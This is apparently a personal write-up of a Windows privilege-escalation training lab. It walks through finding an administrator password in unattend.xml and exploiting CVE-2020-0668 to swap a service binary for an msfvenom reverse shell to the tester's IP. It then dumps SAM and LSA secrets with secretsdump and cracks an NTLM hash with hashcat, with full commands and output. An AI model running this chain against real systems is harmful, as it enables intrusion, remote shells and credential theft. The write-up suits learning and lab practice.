Once connected by RDP we have to find iamtheadministrator credentials. By running `findstr /SIM /C:"iamtheadministrator" *.txt *.ini *.cfg *.config *.xml` we found a file in `C:\Windows\Panther\unattend.xml` where we can find the password.

Now following the Kernel Explois section, we find the machine vulnerable to CVE-2020-0668 so we download the executable and it dependencies **[from here](https://github.com/bypazs/CVE-2020-0668.exe/blob/main/CVE-2020-0668.exe)** (you can compile from source if you want) and like the section, we will attack the maintenanceservice binary

```shell
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe" 

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe 
	NT AUTHORITY\SYSTEM:(I)(F) 
	BUILTIN\Administrators:(I)(F) 
	BUILTIN\Users:(I)(RX) 
	APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX) 
	APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

Now we create a payload pointing to our machine and transfer all the files (do not forget the dependencies of the exploit) to the attack machine by authenticated smb server 

```bash
┌──(kali㉿kali)-[~/Documents/Academy/Windows-privilege-escalation/lab-medium]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.241 LPORT=9001 -f exe > maintenanceservice.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

I used a x86 payload because a x64 was throwing me errors

![[Pasted image 20231125100717.png]]

And now we can execute the binary as htb-student

![[Pasted image 20231125100854.png]]

![[Pasted image 20231125104757.png]]

And we are nt authority/system

Now, we can retrieve the sam, system and security files and dump the hashes with secretsdump

```bash
C:\Windows\system32>reg.exe save hklm\sam n:\sam.save
reg.exe save hklm\sam n:\sam.save
The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\system n:\system.save
reg.exe save hklm\system n:\system.save
The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\security n:\security.save
reg.exe save hklm\security n:\security.save
The operation completed successfully.

----------------

┌──(kali㉿kali)-[~/Documents/Academy/Windows-privilege-escalation/lab-medium]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xfab4b2e32a415ea36f846b9408aa69af
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:aad797e20ba0675bbcb3e3df3319042c:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6b4dacb8dbcf0533bbe34dc66cc0fb8848b0e8ba
dpapi_userkey:0xa61d37e2c548f9206031efff6633f3fb836dbdd6
[*] NL$KM 
 0000   84 AF 72 07 AA 56 82 65  33 F2 C4 60 C3 72 AF C7   ..r..V.e3..`.r..
 0010   E3 0B 71 ED C9 AF 49 1E  89 E5 DA A1 07 5E 7F 88   ..q...I......^..
 0020   65 EC 26 AF 2D A9 2A DC  9C E6 36 7D 9A 2F D9 F6   e.&.-.*...6}./..
 0030   57 44 B6 06 A6 57 7E 29  CD 30 B2 8F 7F 86 CB 47   WD...W~).0.....G
NL$KM:84af7207aa56826533f2c460c372afc7e30b71edc9af491e89e5daa1075e7f8865ec26af2da92adc9ce6367d9a2fd9f65744b606a6577e29cd30b28f7f86cb47
[*] Cleaning up...
```

And crack it with hashcat

```bash
┌──(kali㉿kali)-[~/Documents/Academy/Windows-privilege-escalation/lab-medium]
└─$ sudo hashcat -m 1000 hashtocrack /usr/share/wordlists/rockyou.txt
[sudo] password for kali: 
hashcat (v6.2.6) starting
[...SNIP...]

5835048ce94ad0564e29a924a03510ef:password1

[...SNIP...]
```
